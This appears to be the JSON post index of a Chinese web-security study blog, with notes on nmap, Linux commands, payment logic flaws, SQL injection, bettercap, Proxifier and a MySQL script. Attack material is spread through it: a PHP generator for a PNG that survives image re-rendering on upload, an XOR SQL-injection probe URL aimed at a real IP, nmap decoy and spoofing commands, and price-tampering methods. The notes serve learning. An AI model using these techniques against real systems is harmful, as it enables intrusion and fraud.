{"meta":{"title":"bansxf's blog","subtitle":"Welcome to my blog","description":"Web Security","author":"bansxf","url":"https://lacc233.github.io","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-08T11:16:10.733Z","updated":"2020-05-09T12:01:13.593Z","comments":true,"path":"404/index.html","permalink":"https://lacc233.github.io/404/","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于","date":"2020-07-08T11:16:10.780Z","updated":"2020-05-09T11:59:05.829Z","comments":true,"path":"about/index.html","permalink":"https://lacc233.github.io/about/","excerpt":"","text":"下面写关于自己的内容"},{"title":"所有分类","date":"2020-07-08T11:16:10.781Z","updated":"2020-05-09T11:59:46.523Z","comments":true,"path":"categories/index.html","permalink":"https://lacc233.github.io/categories/","excerpt":"","text":""},{"title":"archives","date":"2020-05-09T07:08:17.000Z","updated":"2020-05-09T13:39:12.954Z","comments":true,"path":"archives/index.html","permalink":"https://lacc233.github.io/archives/","excerpt":"","text":""},{"title":"所有标签","date":"2020-07-08T11:16:10.783Z","updated":"2020-05-09T12:00:03.283Z","comments":true,"path":"tags/index.html","permalink":"https://lacc233.github.io/tags/","excerpt":"","text":""},{"title":"我的朋友们","date":"2020-07-08T11:16:10.783Z","updated":"2020-05-09T12:03:21.470Z","comments":true,"path":"friends/index.html","permalink":"https://lacc233.github.io/friends/","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"}],"posts":[{"title":"icmp协议","slug":"icmp协议","date":"2020-08-22T09:35:58.000Z","updated":"2020-08-22T09:54:23.894Z","comments":true,"path":"categories/网络协议/icmp协议/","link":"","permalink":"https://lacc233.github.io/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/icmp%E5%8D%8F%E8%AE%AE/","excerpt":"Internet Control Message Protocol Internet控制报文协议","text":"Internet Control Message Protocol Internet控制报文协议 它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 ICMP使用IP的基本支持，就像它是一个更高级别的协议，但是，ICMP实际上是IP的一个组成部分，必须由每个IP模块实现。","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://lacc233.github.io/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}],"tags":[]},{"title":"nmap简略参考指南","slug":"nmap简略参考指南","date":"2020-08-22T00:31:43.000Z","updated":"2020-08-27T13:37:43.877Z","comments":true,"path":"categories/工具/nmap简略参考指南/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/nmap%E7%AE%80%E7%95%A5%E5%8F%82%E8%80%83%E6%8C%87%E5%8D%97/","excerpt":"网络探索和安全审核的开源工具","text":"网络探索和安全审核的开源工具 中文手册：http://www.nmap.com.cn/doc/manual.shtm 官方手册：https://nmap.org/book/man.html 博文：https://www.fujieace.com/hacker/tools/nmap-8.html 选项摘要123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114Nmap 7.80（https:&#x2F;&#x2F;nmap.org）用法：nmap [扫描类型] [选项] &#123;目标规范&#125;目标规格： 可以传递主机名，IP地址，网络等。 例如：scanme.nmap.org，microsoft.com &#x2F; 24、192.168.0.1；10.0.0-255.1-254 -iL &lt;inputfilename&gt;：来自主机&#x2F;网络列表的输入 -iR &lt;主机数目&gt;：选择随机目标 --exclude &lt;host1 [，host2] [，host3]，...&gt;：排除主机&#x2F;网络 --excludefile &lt;exclude_file&gt;：从文件中排除列表主机发现： -sL：列出扫描-仅列出要扫描的目标 -sn：Ping扫描-禁用端口扫描 -Pn：将所有主机视为联机-跳过主机发现 -PS &#x2F; PA &#x2F; PU &#x2F; PY [端口列表]：对给定端口的TCP SYN &#x2F; ACK，UDP或SCTP发现 -PE &#x2F; PP &#x2F; PM：ICMP回显，时间戳和网络掩码请求发现探针 -PO [协议列表]：IP协议Ping -n &#x2F; -R：从不进行DNS解析&#x2F;始终解析[默认值：有时] --dns-servers &lt;serv1 [，serv2]，...&gt;：指定自定义DNS服务器 --system-dns：使用操作系统的DNS解析器 --traceroute：跟踪到每个主机的跃点路径扫描技术： -sS &#x2F; sT &#x2F; sA &#x2F; sW &#x2F; sM：TCP SYN &#x2F; Connect（）&#x2F; ACK &#x2F; Window &#x2F; Maimon扫描 -sU：UDP扫描 -sN &#x2F; sF &#x2F; sX：TCP空，FIN和Xmas扫描 --scanflags &lt;标志&gt;：自定义TCP扫描标志 -sI &lt;僵尸主机[：probeport]&gt;：空闲扫描 -sY &#x2F; sZ：SCTP INIT &#x2F; COOKIE-ECHO扫描 -sO：IP协议扫描 -b &lt;FTP中继主机&gt;：FTP退回扫描端口规格和扫描顺序： -p &lt;端口范围&gt;：仅扫描指定的端口 例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9 --exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口 -F：快速模式-扫描的端口少于默认扫描 -r：连续扫描端口-不要随机化 --top-ports &lt;编号&gt;：扫描&lt;编号&gt;最常见的端口 --port-ratio &lt;比率&gt;：扫描端口比&lt;比率&gt;更常见服务&#x2F;版本检测： -sV：探测打开的端口以确定服务&#x2F;版本信息 --version-intensity &lt;级别&gt;：从0（浅）设置为9（尝试所有探针） --version-light：限制为最可能的探测（强度2） --version-all：尝试每个探针（强度9） --version-trace：显示详细的版本扫描活动（用于调试）脚本扫描： -sC：相当于--script &#x3D; default --script &#x3D; &lt;Lua脚本&gt;：&lt;Lua脚本&gt;是逗号分隔的列表 目录，脚本文件或脚本类别 --script-args &#x3D; &lt;n1 &#x3D; v1，[n2 &#x3D; v2，...]&gt;：提供脚本参数 --script-args-file &#x3D;文件名：在文件中提供NSE脚本args --script-trace：显示所有发送和接收的数据 --script-updatedb：更新脚本数据库。 --script-help &#x3D; &lt;Lua脚本&gt;：显示有关脚本的帮助。 &lt;Lua脚本&gt;是逗号分隔的脚本文件列表，或者 脚本类别。操作系统检测： -O：启用操作系统检测 --osscan-limit：将操作系统检测限制为有希望的目标 --osscan-guess：更积极地猜测操作系统时间和性能： 花费&lt;time&gt;的选项以秒为单位，或附加“ ms”（毫秒）， 值的“ s”（秒），“ m”（分钟）或“ h”（小时）（例如30m）。 -T &lt;0-5&gt;：设置时序模板（越高越快） --min-hostgroup &#x2F; max-hostgroup &lt;大小&gt;：并行主机扫描组大小 --min-parallelism &#x2F; max-parallelism &lt;numprobes&gt;：探针并行化 --min-rtt-timeout &#x2F; max-rtt-timeout &#x2F; initial-rtt-timeout &lt;时间&gt;：指定 探测往返时间。 --max-retries &lt;tries&gt;：限制端口扫描探针重传的次数。 --host-timeout &lt;时间&gt;：在很长一段时间后放弃目标 --scan-delay &#x2F;-max-scan-delay &lt;时间&gt;：调整探头之间的延迟 --min-rate &lt;number&gt;：每秒发送数据包的速度不低于&lt;number&gt; --max-rate &lt;number&gt;：每秒发送数据包的速度不超过&lt;number&gt;防火墙&#x2F;标识闪避和疏散： -F; --mtu &lt;val&gt;：分段数据包（可选，带有给定的MTU） -D &lt;decoy1，decoy2 [，ME]，...&gt;：用诱饵掩盖扫描 -S &lt;IP地址&gt;：欺骗源地址 -e &lt;iface&gt;：使用指定的接口 -g &#x2F;-source-port &lt;端口号&gt;：使用给定的端口号 --proxies &lt;url1，[url2]，...&gt;：通过HTTP &#x2F; SOCKS4代理中继连接 --data &lt;十六进制字符串&gt;：将自定义有效负载附加到发送的数据包 --data-string &lt;字符串&gt;：将自定义ASCII字符串附加到发送的数据包 --data-length &lt;num&gt;：将随机数据追加到发送的数据包 --ip-options &lt;选项&gt;：发送具有指定ip选项的数据包 --ttl &lt;val&gt;：设置IP生存时间字段 --spoof-mac &lt;mac地址&#x2F;前缀&#x2F;供应商名称&gt;：欺骗您的MAC地址 --badsum：使用伪造的TCP &#x2F; UDP &#x2F; SCTP校验和发送数据包输出： -oN &#x2F; -oX &#x2F; -oS &#x2F; -oG &lt;文件&gt;：以普通，XML，s | &lt;rIpt kIddi3， 和Grepable格式分别更改为给定的文件名。 -oA &lt;basename&gt;：一次以三种主要格式输出 -v：提高详细程度（使用-vv或更高的效果更好） -d：提高调试级别（使用-dd或更多以获得更大的效果） --reason：显示端口处于特定状态的原因 --open：仅显示打开（或可能打开）的端口 --packet-trace：显示所有发送和接收的数据包 --iflist：打印主机接口和路由（用于调试） --append-output：追加而不是破坏指定的输出文件 --resume &lt;文件名&gt;：恢复中止的扫描 --stylesheet &lt;路径&#x2F; URL&gt;：XSL样式表，可将XML输出转换为HTML --webxml：Nmap.Org的参考样式表，用于更便携式的XML --no-stylesheet：防止关联带有XML输出的XSL样式表MISC： -6：启用IPv6扫描 -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由 --datadir &lt;目录名&gt;：指定自定义Nmap数据文件位置 --send-eth &#x2F;-send-ip：使用原始以太网帧或IP数据包发送 --privileged：假设用户具有完全特权 --unprivileged：假设用户缺乏原始套接字特权 -V：打印版本号 -h：打印此帮助摘要页面。例子： nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8 nmap -v -iR 10000 -Pn -p 80有关更多选项和示例，请参见手册页（https:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man.html） 基本用法扫描单一一个主机 1nmap 192.168.1.1 扫描整个子网 1nmap 192.168.1.1&#x2F;24 扫描多个目标 1nmap 192.168.1.1 192.168.1.3 扫描一个范围内的目标 1nmap 192.168.1.1-100 扫描一个文件内的ip地址列表 1nmap -iL ipTargets.txt 显示所扫描的主机列表 1nmap -sL 192.168.1.1&#x2F;24 扫描除某一个ip外的所有子网主机 1nmap 192.168.1.1&#x2F;24 -exclude 192.168.1.1 扫描除某一个文件中的ip外的子网主机 1nmap 192.168.1.1&#x2F;24 -excludefile xxx.txt 扫描特定主机上的80,21,23端口 1nmap -p80,21,23 192.168.1.1 高级用法12345全面扫描：nmap -T4 -A ip 主机发现：nmap -T4 -sn ip 端口扫描：nmap -T4 ip 服务扫描：nmap -T4 -sV ip 操作系统扫描：nmap -T4 -O ip 查看本地路由与接口 当遇到无法达到目标主机或想选择从多块网卡中某一特定网卡访问目标主机时，可以查看nmap –iflist中提供的网络接口信息 1nmap –iflist 指定网口与IP地址 1nmap -e eth0 targetip 显式地指定发送的源端IP地址 -S &lt;spoofip&gt;，nmap将用指定的spoofip作为源端IP来发送探测包。 使用Decoy（诱骗）方式来掩盖真实的扫描地址，-D ip1,ip2,ip3,ip4,ME，这样就会产生多个虚假的ip同时对目标机进行探测，其中ME代表本机的真实地址，这样对方的防火墙不容易识别出是扫描者的身份 1nmap -T4 -F -n -Pn -D192.168.1.100,192.168.1.101,192.168.1.102,ME 192.168.1.1 定制探测包 Nmap提供–scanflags选项，用户可以对需要发送的TCP探测包的标志位进行完全的控制。可以使用数字或符号指定TCP标志位：URG, ACK, PSH,RST, SYN,and FIN。 例如： 1nmap -sX -T4 –scanflags URGACKPSHRSTSYNFINtargetip 此命令设置全部的TCP标志位为1，可以用于某些特殊场景的探测。 另外使用–ip-options可以定制IP包的options字段。 使用-S指定虚假的IP地址，-D指定一组诱骗IP地址（ME代表真实地址）。-e指定发送探测包的网络接口，-g（–source- port）指定源端口，-f指定使用IP分片方式发送探测包，–spoof-mac指定使用欺骗的MAC地址。–ttl指定生存时间。 扫描防火墙 使用技巧123--host-timeout 主机超时时间，通常选值 18000-scan-delay 报文时间间隔 通常1000-S &lt;源地址&gt; 定义扫描源地址，为了不被发现 目标规格-iL &lt;inputfilename&gt; 从文件中读取目标规格 -iR &lt;num hosts&gt; 选择随机目标，使用命令 nmap -Pn -sS -p 80 -iR 0 –open 查找随机Web服务器进行浏览 --exclude &lt;host1&gt;[,&lt;host2&gt;[,...]] 不包括主机/网络 --excludefile &lt;exclude_file&gt; 从文件中排除列表（主机/网络） 主机发现-sL 获取主机名，反向dns解析（不发送任何数据包到目标主机） -sn 获取存活主机，ping扫描（无端口扫描） 默认情况下，完成的主机发现-sn包括ICMP回显请求，对端口443的TCP SYN，对端口80的TCP ACK和ICMP时间戳请求。当由非特权用户执行时，仅SYN数据包（使用connect呼叫）发送到目标上的端口80和443。当特权用户尝试扫描本地以太网上的目标时，除非--send-ip指定，否则将使用ARP请求 。该-sn选项可以与任何发现探针类型组合（-P*选项，不包括-Pn）以获得更大的灵活性。如果使用这些探针类型和端口号选项中的任何一个，则默认探针将被覆盖。如果在运行Nmap的源主机和目标网络之间设置了严格的防火墙，则建议使用这些高级技术。否则，当防火墙丢弃探针或其响应时，主机可能会丢失。 -Pn 无ping 扫描 -PS 发送设置了SYN标志的空TCP数据包，如果指定了多个探针，则将并行发送，示例是 -PS22和 -PS22-25,80,113,1050,35000。 -PA TCP ACK ping 端口扫描 端口状态 解析 Open 端口开启，有程序监听此端口 Closed 端口关闭，数据能到达主机，但是没有程序监听此端口 Filtered 数据未能到达主机 Unfiltered 数据能到达主机，但是Nmap无法判断端口开启还是关闭 Open/filtered 端口没返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描 Closed / filtered 只出现在IP ID idle 扫描 扫描技术-sS：TCP SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快）利用基本的SYN扫描方式探测其端口开放状态 -sA：ACK扫描 利用ACK扫描判断端口是否被过滤。针对ACK探测包，未被过滤的端口（无论打开、关闭）会回复RST包。 -sT：TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同，耗时长） -sU：UDP扫描（扫描DNS，SNMP和DHCP等服务，更慢更困难） -sF：FIN scan 可以利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态 -sP：PING Scan -sV：版本探测 -sL：Idle scan -O：OS探测 脚本扫描","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"linux命令crontab","slug":"linux命令crontab","date":"2020-06-15T03:03:01.000Z","updated":"2020-06-15T05:29:19.723Z","comments":true,"path":"categories/Linux/linux命令crontab/","link":"","permalink":"https://lacc233.github.io/categories/Linux/linux%E5%91%BD%E4%BB%A4crontab/","excerpt":"crontab：定时任务的守护进程，精确到分，设计秒的我们一般写脚本 –&gt;相当于闹钟 日志文件: ll /var/log/cron*编辑文件： vim /etc/crontab进程：ps -ef | grep crond ==&gt; /etc/init.d/crond restart作用：定时备份，实时备份","text":"crontab：定时任务的守护进程，精确到分，设计秒的我们一般写脚本 –&gt;相当于闹钟 日志文件: ll /var/log/cron*编辑文件： vim /etc/crontab进程：ps -ef | grep crond ==&gt; /etc/init.d/crond restart作用：定时备份，实时备份 https://www.cnblogs.com/ftl1012/p/crontab.html 常用的命令安装crontab1yum install crontabs crontab服务操作说明1234567&#x2F;sbin&#x2F;service crond start &#x2F;&#x2F;启动服务 &#x2F;sbin&#x2F;service crond stop &#x2F;&#x2F;关闭服务 &#x2F;sbin&#x2F;service crond restart &#x2F;&#x2F;重启服务 &#x2F;sbin&#x2F;service crond reload &#x2F;&#x2F;重新载入配置 参数12345678usage: crontab [-u user] file crontab [-u user] [ -e | -l | -r ] (default operation is replace, per 1003.2) -e (edit user&#39;s crontab) -l (list user&#39;s crontab) -r (delete user&#39;s crontab) -i (prompt before deleting user&#39;s crontab) -s (selinux context) 定时任务分类 Linux下的任务调度分为两类，系统任务调度和用户任务调度。 系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc/crontab文件，这个就是系统任务调度的配置文件。 用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。 在crontab 文件都被保存在/var/spool/cron目录中。其文件名与用户名一致","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"}],"tags":[{"name":"命令","slug":"命令","permalink":"https://lacc233.github.io/tags/%E5%91%BD%E4%BB%A4/"}]},{"title":"kali下卸载软件","slug":"kali下卸载软件","date":"2020-06-15T01:24:20.000Z","updated":"2020-06-15T05:28:54.246Z","comments":true,"path":"categories/Linux/Kali-Linux/kali下卸载软件/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%E4%B8%8B%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/","excerpt":"卸载命令","text":"卸载命令 ali中主要为2种卸载方法：1、apt2、dpkg 使用apt的方式有： 123apt-get remove [package]apt-get remove --purge # ------(package 删除包，包括删除配置文件等) apt-get autoremove --purge # ----(package 删除包及其依赖的软件包+配置文件等 使用dpkg 12dpkg -r #移除一个已安装的包。dpkg -P #完全清除一个已安装的包。和 remove 不同的是，remove 只是删掉数据和可执行文件， purge 另外还删除所有的配制文件。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[{"name":"命令","slug":"命令","permalink":"https://lacc233.github.io/tags/%E5%91%BD%E4%BB%A4/"}]},{"title":"注入","slug":"注入","date":"2020-06-11T06:05:43.000Z","updated":"2020-06-11T08:16:07.262Z","comments":true,"path":"categories/应用安全风险/注入/","link":"","permalink":"https://lacc233.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E6%B3%A8%E5%85%A5/","excerpt":"将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。","text":"将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。","categories":[{"name":"应用安全风险","slug":"应用安全风险","permalink":"https://lacc233.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"}],"tags":[{"name":"注入","slug":"注入","permalink":"https://lacc233.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"图片上传绕过二次渲染","slug":"图片上传绕过二次渲染","date":"2020-06-10T23:47:22.000Z","updated":"2020-06-10T23:51:00.702Z","comments":true,"path":"categories/web安全/图片上传绕过二次渲染/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/","excerpt":"二次渲染绕过","text":"二次渲染绕过 上传png 直接运行国外大神脚本 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 运行 1php png.php 若报错如下，参考 https://www.cnblogs.com/xd502djj/p/4293180.html 12PHP Fatal error: Uncaught Error: Call to undefined function imagecreatetruecolor()","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://lacc233.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"逻辑支付漏洞","slug":"逻辑支付漏洞","date":"2020-06-10T03:50:47.000Z","updated":"2020-06-10T04:14:29.700Z","comments":true,"path":"categories/web安全/逻辑支付漏洞/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/","excerpt":"支付漏洞","text":"支付漏洞 支付漏洞的理解通常是篡改价格 例一： 充值的时候，程序只判断订单没有支付成功，但没有判断金额，例如生成订单跳至支付宝页面，在原网站上点支付失败，这时 可以修改订单，改成更大的金额（订单号没变），回到支付宝支付界面，支付成功，程序并没有重新核对支付宝实际的金额，只是把订单改为已支付。 例二： 使用余额支付，把数量改为负数，扣除余额时，负负得正，这时余额增加。 如何测试交易中是否存在逻辑漏洞？ 1.在购买过程中修改产品价格，数量 2.在支付时修改总价格或者优惠价格 3.订单生成后，编辑订单把A商品的价格改为B商品的价格，实现低价支付，测试时修改数量，单价，优惠价格参数为负数，小数，无限大，看是否生成订单，能生成进入支付及说明存在逻辑漏洞了 交易中支付漏洞的几种常见类型？ 1.修改金额 2.修改商品数量 3.修改优惠金额 4.修改数量，单价，优惠价格参数为负数，小数，无限大 5.商品价格更改 6.支付key泄露 实际安全中会有一些特别的,反正各种能改的参数都去尝试，个数，单价，优惠卷个数，单价，总额。每个值都可能存在问题，就看服务自身处理是否有问题了 支付漏洞一般分为三类： 在支付过程中直接发含有支付金额的数据包 没有对购买的数量进行限制 程序的异常处理（如：99999999，月份过多超出） 还有更多的利用方案…","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"https://lacc233.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"}]},{"title":"sql注入之异或注入","slug":"sql注入之异或注入","date":"2020-06-09T12:16:23.000Z","updated":"2020-06-09T12:39:07.989Z","comments":true,"path":"categories/web安全/sql注入之异或注入/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/","excerpt":"异或注入","text":"异或注入 两个同为真的条件做异或，结果为假 两个同为假的条件做异或，结果为假 一个条件为真，一个条件为假，结果为真 null与任何条件（真、假、null）做异或，结果都为null xor与^区别： ^运算符会做位异或运算 如1^2=3 1^2=3 xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 用处： 可用于判断过滤 http://120.24.86.145:9004/1ndex.php?id=1’^(length(‘union’)=5)%23 当union被过滤时1^0 输出id=1 当union没被过滤时 1 ^ 1 输出 id=0 回显 error","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"proxifier使用教程","slug":"proxifier使用教程","date":"2020-05-30T11:46:24.000Z","updated":"2020-05-30T12:21:09.832Z","comments":true,"path":"categories/工具/proxifier使用教程/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"转载自：https://blog.csdn.net/u013066730/article/details/88788191","text":"转载自：https://blog.csdn.net/u013066730/article/details/88788191 前言成功搭建使用shadowshocks实现代理访问google，然而只能浏览器代理方式使用，不能其他程序使用代理，不利于白帽子匿名安全检测，下面将介绍利用Proxifier实现全局代理。 安装官网发布多个版本，其中便携版不需要安装，直接双击运行，安装版则直接安装即可 Windows便携版：官网地址 Windows安装版：官网地址 Mac版：官网地址 使用教程1.打开软件点击Profile，接下来配置的三步顺序 代理服务器配置代理规则设置域名解析设置 2.配置第一步 点击Proxy Server按钮add输入本地shadowshocks的ip（默认127.0.0.1）和端口（默认1080）选择SHOCKS Versin 5然后点击checkOK 显示Proxy is ready to work with Proxfier! 则此步骤配置成功，否则认真检查端口是否正确以及shadowsocks是否运行。 接下来的两步配置至关重要，配置错误可能导致全局代理失败或者循环代理3.配置第二步 点击Proxification Rule选中localhost,点击EditTarget hosts处添加shadowshocks代理服务器的IP地址（以123.123.123.123示例）Action选择Direct(直连)OK 注：此配置步骤允许发送到代理服务器的数据包通过，防止循环代理错误配置后如图 4.配置第三步 点击Name Resolution选择第二个Resolve hostnames through proxy（通过代理服务器解析域名）OK 5.至此，全局代理已经配置完毕，用CMD命令nslookup www.google.com测试是否成功获取其IP地址，也可以直接访问www.ip138.com查看当前外网IP地址。其他使用 Proxifier的规则设置十分灵活强大，可以默认所有数据流量都通过代理，即以上设置。同时也可以通过对特殊应用或者端口进行更细粒度的代理设置，比如想要QQ数据包不通过代理，只需要添加规则，应用选择QQ,直连即可如果想尽量减小代理的流量 也可以修改默认规则为直连，然后添加需要的特殊应用为代理访问","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"proxifier","slug":"proxifier","permalink":"https://lacc233.github.io/tags/proxifier/"}]},{"title":"bettercap工具使用","slug":"bettercap工具使用","date":"2020-05-29T01:13:19.000Z","updated":"2020-05-30T05:06:47.787Z","comments":true,"path":"categories/工具/bettercap工具使用/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/bettercap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"内网 网络安全工具，用与抓包，中间人 https://github.com/bettercap/bettercap","text":"内网 网络安全工具，用与抓包，中间人 https://github.com/bettercap/bettercap 安装与使用kali 上，apt-get install bettercap， 安装 1bettercap -iface 网卡 help或 ？查看帮助信息和模块是否开启 get 查看变量 set 设置变量，退出重连后恢复默认 quit退出 模块名加on或者off，开，关 123net.recon onnet.show 显示主机缓存列表net.show by seen&#x2F;sent&#x2F;revd 排列顺序 帮助信息1 参数 介绍 -autostart string 用逗号分隔要自动启动的模块列表(默认“events.stream”) -caplet string 从该文件中读取命令并在交互式会话中执行它们 -cpu-profile file 编写cpu配置文件 -debug 打印调试信息 -env-file string 如果找到此文件中的环境变量，则将其设置为空，以禁用环境持久性 -eval string 在交互式会话中使用”;”分隔一个或多个命令，通过命令行设置变量 -gateway-override string 使用提供的IP地址而不是默认网关。如果未指定或无效，将使用默认网关 -iface string 要绑定到的网络接口，如果为空，则自动选择默认接口 -mem-profile file 将内存配置文件写入文件 -no-colors 禁用输出颜色效果 -no-history 禁用交互式会话历史文件 -silent 取消所有非错误的日志 -version 打印版本并退出 帮助信息2 命令 介绍 help MODULE 列出可用的命令，如果没有提供模块名，则显示模块特定的帮助 active 显示有关活动模块的信息 quit 关闭会话并退出 sleep SECONDS 在给定的时间内睡眠 get NAME 获取变量名的值，对所有变量单独使用，或将NAME作为通配符 set NAME VALUE 设置变量名的值 read VARIABLE PROMPT 显示一个提示，要求用户输入将被保存在变量中 clear 清除屏幕 include CAPLET 在当前会话中加载并运行这个CAPLET ! COMMAND 执行shell命令并打印其输出 alias MAC NAME 给定端点的MAC地址，为其分配别名 用法 https://www.bettercap.org/usage/ 模组 https://www.bettercap.org/modules/ 开启模块前设置，模块启动后，再修改将在下一次开启后生效 脚本加载脚本bett/caplets","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"python连接mysql并查表","slug":"python连接mysql并查表","date":"2020-05-28T22:48:27.000Z","updated":"2020-05-28T22:49:36.467Z","comments":true,"path":"categories/python/python连接mysql并查表/","link":"","permalink":"https://lacc233.github.io/categories/python/python%E8%BF%9E%E6%8E%A5mysql%E5%B9%B6%E6%9F%A5%E8%A1%A8/","excerpt":"连接数据库，查表","text":"连接数据库，查表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# -*-coding:utf-8-*-# Created by 0vox on 2020/5/26import mysql.connectorfrom mysql.connector import errorcodefrom tabulate import tabulate# import datetimedef conn(): config = &#123; 'user': 'test', 'password': 'testroot', 'host': '127.0.0.1', 'database': 'test', 'raise_on_warnings': True &#125; try: cnx = mysql.connector.connect(**config) print(\"连接成功\") cursor = cnx.cursor() query = (\"SELECT id, username, password FROM users\") cursor.execute(query) # 输出格式1 table_user = [\"id\", \"username\", \"password\"] print(tabulate(cursor, table_user, tablefmt=\"pipe\")) # 输出格式2 # for (id, username, password) in cursor: # print(\"&#123;&#125;, &#123;&#125;, &#123;&#125;\".format( # id, username, password)) except mysql.connector.Error as err: if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: print(\"Something is wrong with your user name or password\") elif err.errno == errorcode.ER_BAD_DB_ERROR: print(\"Database does not exist\") else: print(err) else: cursor.close() cnx.close() print(\"已断开连接\")def main(): conn()if __name__ == \"__main__\": 